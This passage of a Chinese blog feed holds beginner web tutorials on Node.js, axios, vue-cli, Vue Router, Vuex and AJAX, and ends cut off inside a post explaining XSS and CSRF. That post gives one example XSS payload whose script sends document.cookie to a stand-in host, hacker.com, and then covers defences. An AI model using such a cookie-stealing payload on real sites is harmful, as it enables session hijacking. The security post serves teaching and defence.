class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)</span><br><span class="line">fs.readFile(&apos;/Users/ringcrl/Desktop/1.txt&apos;, (err, data) =&gt; &#123;</span><br><span class="line">  console.log(err);</span><br><span class="line">  console.log(data.toString);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>修改1.txt中的内容为： 我是1.txt ， 运行可以看到打印出1.txt中的内容</p><h3 id="fs-readFileSync-path-options-同步读取文件"><a href="#fs-readFileSync-path-options-同步读取文件" class="headerlink" title="fs.readFileSync(path[, options])同步读取文件"></a>fs.readFileSync(path[, options])同步读取文件</h3><p>1、官方文档抄代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)</span><br><span class="line"></span><br><span class="line">let data = fs.readFileSync(&apos;/Users/ringcrl/Desktop/1.txt&apos;)</span><br><span class="line">console.log(data.toString());</span><br></pre></td></tr></table></figure></p><p>可以看到同样打印出了1.txt中的内容<br><img src="https://i.loli.net/2018/08/24/5b80033684428.png" alt="alt text"></p><h2 id="创建一个http-server"><a href="#创建一个http-server" class="headerlink" title="创建一个http server"></a>创建一个http server</h2><p>一般来说stackoverflow上都有可以直接拿过来跑的代码，注意搜索时的关键词eg：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stackoverflow nodejs set response -express  // -express的意思是除去带有express关键字的内容</span><br></pre></td></tr></table></figure></p><p>text.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">let http = require(&apos;http&apos;)</span><br><span class="line"></span><br><span class="line">let server = http.createServer(function(req,res)&#123;</span><br><span class="line">    console.log(req.url)</span><br><span class="line">    res.statusCode = 201</span><br><span class="line">    res.write(&apos;hello&apos;);</span><br><span class="line">    res.end()  // 不调用的话就一直在发送请求</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(9999)  // 监听的端口号</span><br><span class="line">console.log(&apos;9999&apos;)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>axios的使用</title>
      <link href="/2018/08/23/axios%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/08/23/axios%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>基于Vue搭建CNODE社区<br><a id="more"></a></p><h2 id="什么是axios"><a href="#什么是axios" class="headerlink" title="什么是axios"></a>什么是axios</h2><p>axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中，它本身具有以下特征：</p><ul><li>从浏览器中创建XMLHttpRequest</li><li>从 nodejs 发出http请求</li><li>支持 Promise API</li><li>拦截请求和响应</li><li>转换请求和响应数据</li><li>取消请求</li><li>自动转换JSON数据</li><li>客户端支持防止 CSRF/XSRF</li></ul><h2 id="在Vue中使用"><a href="#在Vue中使用" class="headerlink" title="在Vue中使用"></a>在Vue中使用</h2><h3 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h3><p>1、安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure></p><p>2、引入加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import axios from &apos;axios&apos;</span><br></pre></td></tr></table></figure></p><p>3、将axios全局挂载到Vue原型上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$http = axios;  // 这样就可以直接使用this.$http发送请求</span><br></pre></td></tr></table></figure></p><p>4、发送请求（以CNODE社区API为例）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">使用传统的function：</span><br><span class="line">getData()&#123;</span><br><span class="line">    var self = this;  // 传统的function需要将this赋值给一个新的变量</span><br><span class="line">    this.$http.get(&apos;https://cnodejs.org/api/v1/topics&apos;)</span><br><span class="line">        .then(function (res) &#123;</span><br><span class="line">            // 如果直接使用this.items = res.data.data 会出错，因为此处的this指向的不是当前vue实例</span><br><span class="line">            self.items = res.data.data</span><br><span class="line">            console.log(res.data.data)</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(function (err) &#123;</span><br><span class="line">            console.log(err)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ES6箭头函数的写法</span><br><span class="line">getData()&#123;</span><br><span class="line">    this.$http.get(&apos;https://cnodejs.org/api/v1/topics&apos;)</span><br><span class="line">        .then(res =&gt;&#123;  // 可以直接使用this，因为箭头函会继承它父类的this</span><br><span class="line">            this.items = res.data.data</span><br><span class="line">            console.log(res)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>两种传递参数的形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">推荐：（都是CNODE官方提供的API）</span><br><span class="line">axios.get(&apos;url&apos;, &#123;</span><br><span class="line">    params: &#123;</span><br><span class="line">        page: 1,  // 页码</span><br><span class="line">        limit: 10  // 每页显示的数量</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">将参数直接写在地址后面：</span><br><span class="line">axios.get(&apos;https://cnodejs.org/api/v1/topics?page=1&amp;limit=15&apos;)</span><br></pre></td></tr></table></figure></p><h3 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h3><p>POST传递数据有两种格式：</p><ul><li>form-data?page=1&amp;limit=10</li><li>x­www­form­urlencoded { page: 1,limit: 10 }</li></ul><p>但因为在axios中post请求接收的参数必须是form-data的格式，所以需要用到一个qs插件来转换参数格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先 npm install qs</span><br><span class="line">qs.stringify可以将格式转换成form-data的形式</span><br><span class="line"></span><br><span class="line">postData()&#123;</span><br><span class="line">    this.$http.post(&apos;url&apos;,qs.stringify(&#123;</span><br><span class="line">        page:1,</span><br><span class="line">        limit:10</span><br><span class="line">    &#125;)).then(res=&gt;&#123;</span><br><span class="line">        this.items = res.data.data;</span><br><span class="line">        console.log(res)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> axios </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vue-cli脚手架搭建项目</title>
      <link href="/2018/08/23/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE/"/>
      <url>/2018/08/23/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>项目搭建、目录结构分析及vue-router、Vuex的使用<br><a id="more"></a></p><h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p>1、在电脑上安装最新版的nodeJS，安装完成后安装淘宝镜像<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></p><p>2、全局安装vue-cli<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g vue-cli</span><br></pre></td></tr></table></figure></p><p>// 如果已经安装过nodejs和vue-cli，可直接进行项目初始化</p><p>3、进入想要存放项目文件的目录下，然后初始化项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack my-project</span><br></pre></td></tr></table></figure></p><p>4、进入项目文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd my-project</span><br></pre></td></tr></table></figure></p><p>5、安装依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure></p><p>6、启动项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure></p><p>打开<a href="http://localhost:8080，你会看到" target="_blank" rel="noopener">http://localhost:8080，你会看到</a><br><img src="https://i.loli.net/2018/08/23/5b7e8b818bc8e.png" alt="alt text"></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>build  项目构建(webpack)相关代码</p><ul><li>build.js  // 生产环境构建代码</li><li>check-version.js  // 检查node&amp;npm等版本</li><li>dev-client.js  // 热加载相关</li><li>dev-server.js  // 构建本地服务器</li><li>utils.js  // 构建配置共用工具</li><li>vue-loader.conf.js  // vue加载器</li><li>webpack.base.conf.js  // webpack基础环境配置</li><li>webpack.dev.conf.js  // webpack开发环境配置</li><li>webpack.prod.conf.js  // webpack生产环境配置</li></ul><p>config  项目开发环境配置相关代码</p><ul><li>dev.env.js  // 开发环境变量</li><li>index.js  // 项目一些配置变量</li><li>prod.env.js  // 生产环境变量</li></ul><p>node_modules 项目依赖模块，npm install执行后初始化项目会将所有依赖放在这里</p><p>src  源码目录</p><ul><li>assets  // 资源目录 eg：logo.png</li><li>components  // vue公共组件 eg：App.vue</li><li>router  // 前端路由 eg：index.js路由配置文件</li><li>App.vue  // 页面入口文件（根组件）</li><li>main.js  // 程序入口文件（入口js文件）</li></ul><p>static  静态文件（比如图片、json数据等）</p><ul><li>.gitkeep</li></ul><p>其他</p><ul><li>.babelrc  // ES6语法编译配置</li><li>.editorconfig  // 定义代码格式</li><li>.gitignore  // git上传需要忽略的文件格式</li><li>index.html  // 入口页面</li><li>package.json  // 项目基本信息</li><li>README.md  // 项目说明</li></ul><h2 id="vue-router路由"><a href="#vue-router路由" class="headerlink" title="vue-router路由"></a>vue-router路由</h2><p>1、安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save vue-router</span><br></pre></td></tr></table></figure></p><p>2、引用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import router from &apos;vue-router&apos;</span><br><span class="line">Vue.use(router)</span><br></pre></td></tr></table></figure></p><p>3、配置路由文件，并在vue实例中注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var rt = new router(&#123;</span><br><span class="line">  routes: [  // 配置</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/hello&apos;, //指定要跳转的路径</span><br><span class="line">      component: HelloWorld //指定要跳转的组件</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &apos;#app&apos;,</span><br><span class="line">    router:router,  // 实例中注入</span><br><span class="line">    components: &#123;</span><br><span class="line">        App</span><br><span class="line">    &#125;,</span><br><span class="line">    template: &apos;&lt;App/&gt;&apos;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>4、确定视图加载位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure></p><h3 id="路由的跳转"><a href="#路由的跳转" class="headerlink" title="路由的跳转"></a>路由的跳转</h3><p><router-link to="/"></router-link><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;router-link to=&quot;/helloworld&quot;&gt;HELLO WORLD&lt;/router-link&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;router-link to=&quot;/helloearth&quot;&gt;HELLO EARTH&lt;/router-link&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></p><h3 id="路由参数的传递"><a href="#路由参数的传递" class="headerlink" title="路由参数的传递"></a>路由参数的传递</h3><p>1、必须在路由内加入路由的name</p><p>2、必须在path后加/: +传递的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123; name: helloearth, params: &#123;msg: 只有一个地球&#125; &#125;&quot;&gt;HELLO WORLD&lt;/router-link&gt;</span><br><span class="line">读取参数： $route.params.XXX</span><br><span class="line">方式：===/helloworld/你好世界</span><br><span class="line"></span><br><span class="line">&lt;router-link :to=&quot;&#123; path: &apos;/helloearth&apos;, query: &#123;msg: 只有一个地球&#125; &#125;&quot;&gt;HELLO WORLD&lt;/router-link&gt;</span><br><span class="line">方式：===/helloworld?name=XX&amp;count=xxx</span><br><span class="line"></span><br><span class="line">函数模式：</span><br><span class="line">可以创建一个函数返回 props，这样便可以将参数转换成另一种类型，将静态值与基于路由的值结合</span><br><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">    routes: [</span><br><span class="line">        &#123;</span><br><span class="line">            path: &apos;/search&apos;,</span><br><span class="line">            component: SearchUser,</span><br><span class="line">            props: (route) =&gt; (&#123;</span><br><span class="line">                query: route.query.q</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Vuex的store状态管理"><a href="#Vuex的store状态管理" class="headerlink" title="Vuex的store状态管理"></a>Vuex的store状态管理</h2><p>用来管理状态，共享数据，在各个组件之间管理外部状态，使用方法：</p><ul><li><p>安装Vuex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vuex</span><br></pre></td></tr></table></figure></li><li><p>引入vuex，并通过use方法使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import Vuex from &apos;vuex&apos;</span><br><span class="line">Vue.use(Vuex)</span><br></pre></td></tr></table></figure></li><li><p>创建状态仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//  Store必须是大写，参数state不能改名字</span><br><span class="line">var store = new Vue.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        xxx: yyy</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>通过 this.$store.state.xxx 拿到全局状态</p></li></ul><h3 id="Vuex下的mutations、actions和getters"><a href="#Vuex下的mutations、actions和getters" class="headerlink" title="Vuex下的mutations、actions和getters"></a>Vuex下的mutations、actions和getters</h3><p>vuex状态管理的流程：</p><p>view -&gt; actions -&gt; mutations –&gt; state —­&gt; view</p><p>mutations和actions的不同之处：</p><ul><li>参数：mutations接收的参数是state，actions接收的是context</li><li>异步操作：mutations只能包含同步操作，而actions可以包含异步操作</li><li>mutations直接变更状态（state），而actions提交的是mutation而非直接变更状态</li><li>调用方式：mutations通过this.$store.commit(‘’)调用，actions通过this.$store.dispatch(‘’)调用</li></ul><p>注意：actions是可有可无的，没有actions的话，view直接走mutations中的逻辑，但是如果有异步操作，则必须使用actions</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var store = new Vue.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        xxx: yyy</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;  // 调用：this.$store.commit(&apos;xxx&apos;)参数为字符串格式</span><br><span class="line">        aaa:function(state)&#123;</span><br><span class="line">            // 一些操作</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;  // 调用：this.$store.dispatch(&apos;xxx&apos;)</span><br><span class="line">        bbb:function(context)&#123;</span><br><span class="line">            context.commit(&apos;aaa&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    getters:&#123;  // 调用：this.$store.getters.ccc</span><br><span class="line">        ccc(state)&#123;</span><br><span class="line">            return ... ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> vue-cli </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AJAX</title>
      <link href="/2018/08/20/AJAX/"/>
      <url>/2018/08/20/AJAX/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Ajax 的主要优势就是对页面的请求以异步的方式发送到服务器，而服务器不会以整个页面来响应请求，它会在后台处理，与此同时用户还能继续浏览页面并与页面交互。<br><a id="more"></a><br>Ajax 的核心技术就是 XMLHttpResquest 对象，这个对象充当浏览器中的脚本（客户端）与服务器之间的中间人角色，以往的请求都是由浏览器发出，而JS通过这个对象可以自己发送请求，同时自己处理响应。</p><h3 id="使用原生JS写一个AJAX请求"><a href="#使用原生JS写一个AJAX请求" class="headerlink" title="使用原生JS写一个AJAX请求"></a>使用原生JS写一个AJAX请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function getNewContent()&#123;</span><br><span class="line">    let request = new XMLHttpRequest()  // 创建一个新对象</span><br><span class="line">    request.open(method,url);  // open 方法用来指定请求方法，请求地址或路径</span><br><span class="line">    request.onreadystatechange = function()&#123;  // onreadystatechange 是一个事件处理函数，在服务器给 XMLHttpRequest 对象送回响应时触发，函数内容主要是处理响应</span><br><span class="line">        if(request.readyState === 4)&#123;  // 监听请求状态的改变，当 readyState 的属性变成4时，说明请求完成了</span><br><span class="line">            if(request.status &gt;= 200 &amp;&amp; request.status &lt; 300)&#123;  // 如果请求完成，且状态码返回2xx，表示请求成功</span><br><span class="line">                console.log(request.responseText)</span><br><span class="line">            &#125;else if(request.status &gt;= 400)&#123;  // 如果请求完成，且状态码返回4xx，表示请求失败</span><br><span class="line">                console.log(&apos;请求失败&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    request.send(body)  // 在指定了请求体，也明确了如何处理响应后，就可以用 send 方法来发送请求</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="jQuery对ajax的封装"><a href="#jQuery对ajax的封装" class="headerlink" title="jQuery对ajax的封装"></a>jQuery对ajax的封装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(&apos;filename&apos;).then(function(response)&#123;</span><br><span class="line">    // 这里是response的内容</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>目前常见的是用ajax请求JSON格式的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(&apos;/data.php&apos;).then(function(response)&#123;</span><br><span class="line">    // response内容为 &#123; &quot;name&quot;: &quot;jayce&quot; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>在使用AJAX时要注意同源策略，使用XMLHttpRequest对象发送请求只能访问与其所在的HTML处于同一个域中的数据，不能向其他域发送请求。同源政策的目的是为了保证用户信息的安全，防止恶意的网站窃取数据。只有（协议+域名+端口）一模一样时才允许发 AJAX 请求，eg：</p><ul><li><a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a> 可以向 <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> 发 AJAX 请求吗？ no协议不同</li><li><a href="http://baidu.com:80" target="_blank" rel="noopener">http://baidu.com:80</a> 可以向 <a href="http://baidu.com:81" target="_blank" rel="noopener">http://baidu.com:81</a> 发 AJAX 请求吗？ no端口不一样</li></ul><h3 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h3><p>CORS全称是跨域资源共享（Cross-origin resource sharing）能克服 AJAX 只能同源使用的限制，告诉浏览器我们是一家的别阻止他。简单来说就是服务端在响应头中添加一个 Access-Control-Allow-Origin 的头部，头部的值为客户端的域名，eg：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;url&apos;)</span><br></pre></td></tr></table></figure></p><h3 id="JSONP与AJAX"><a href="#JSONP与AJAX" class="headerlink" title="JSONP与AJAX"></a>JSONP与AJAX</h3><p>相同点：</p><ul><li>ajax和jsonp的调用方式很像，目的一样，都是请求url，然后把服务器返回的数据进行处理</li></ul><p>不同点：</p><ul><li><p>AJAX（异步的Javascript和XML）核心是通过XMLHttpRequest请求内容，支持get、post、delete等。（通过CORS可以突破同源政策的限制实现跨域请求）</p></li><li><p>JSONP的核心则是通过动态添加script标签来调用服务器提供的js脚本（后缀.json)，只支持get请求。（网页通过添加一个script元素向服务器请求JSON数据，这种做法不受同源政策的限制，服务器在收到请求后，将数据打包放在一个指定名字的回调函数里传回来）</p></li></ul>]]></content>
      
      
        <tags>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安全：XSS和CSRF</title>
      <link href="/2018/08/16/%E5%AE%89%E5%85%A8%EF%BC%9AXSS%E5%92%8CCSRF/"/>
      <url>/2018/08/16/%E5%AE%89%E5%85%A8%EF%BC%9AXSS%E5%92%8CCSRF/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>初次理解XSS和CSRF攻击<br><a id="more"></a></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>全称 Cross Site Script 跨站脚本攻击，原本缩写为CSS，但为了区别于层叠样式表，在安全领域称为XSS。</p><p>XSS攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。</p><p>有多种方式进行XSS攻击，但它们的共同点是：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者使用的机器上进行一些恶意操作</p><p>常见的基于DOM的XSS攻击是指通过恶意脚本修改页面DOM结构，是纯粹发生在客户端的攻击，eg：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = userComment</span><br><span class="line"></span><br><span class="line">// userComment 内容是 &lt;script&gt;$.get(&apos;http://hacker.com?cookie=&apos; + document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>此时恶意就被执行了</p><h3 id="XSS防范"><a href="#XSS防范" class="headerlink" title="XSS防范"></a>XSS防范</h3><p>1、HttpOnly 这个属性可以防止XSS，它会禁止javascript脚本来访问cookie。</p><p>前面说道攻击者可以通过注入恶意脚本获取用户的cookie信息，通常cookie中都包含了用户的登录凭证信息，攻击者在获取到cookie之后，就可以发起cookie劫持攻击。所以严格来说HttpOnly并非阻止XSS攻击，而是阻止XSS攻击后的cookie劫持</p><p>2、不要使用innerHTML，改成innerText，此时script标签里的内容就会被当成文本，不执行。</p><p>如果一定要用innerHTML，使用字符过滤（XSS filter），在前端框架中一般都会有一份decodingMap，用于对用户输入的包含特殊字符进行过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const decodingMap = &#123;</span><br><span class="line">    &apos;&amp;lt;&apos;: &apos;&lt;&apos;,</span><br><span class="line">    &apos;&amp;gt;&apos;: &apos;&gt;&apos;,</span><br><span class="line">    &apos;&amp;quot;&apos;: &apos;&quot;&apos;,</span><br><span class="line">    &apos;&amp;amp;&apos;: &apos;&amp;&apos;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>全称：Cross Site Request Forgery 即跨站请求伪造，是一种劫持受信任用户像服务器发送非预期请求的攻击方式</p><p>通常情况下，CSRF攻击是攻击者借助受害者的cookie骗取服务器信任，可以在受害者不知情的情况下以受害者名义伪造请求发送给受攻击的服务器，从而在并未授权的情况下执行在权限保护之下的操作</p><p>eg：</p><ul><li>用户在 qq.com 登陆</li><li>用户切换到 hacker.com （恶意网站）</li><li>hacker.com 发送一个 qq.com/add-friend 的请求，让用户添加hacker为好友</li><li>用户在不知情的情况下添加了hacker为好友</li><li>用户本身没有想发送这个请求，但hacker伪造了用户发请求的假象</li></ul><p>由于 cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起CSRF攻击。在攻击过程中，攻击者借助受害者的cookie骗取服务器信任，但并不能拿到cookie，也看不到cookie的内容，对于服务器返回的内容，由于同源策略的限制，也无法进行解析。所以，攻击者无法从返回结果中得到任何东西。所能做的就是给服务器发送请求，执行请求中的命令，在服务器直接改变数据的值，而非窃取服务器中的数据。</p><h3 id="CSRF防范"><a href="#CSRF防范" class="headerlink" 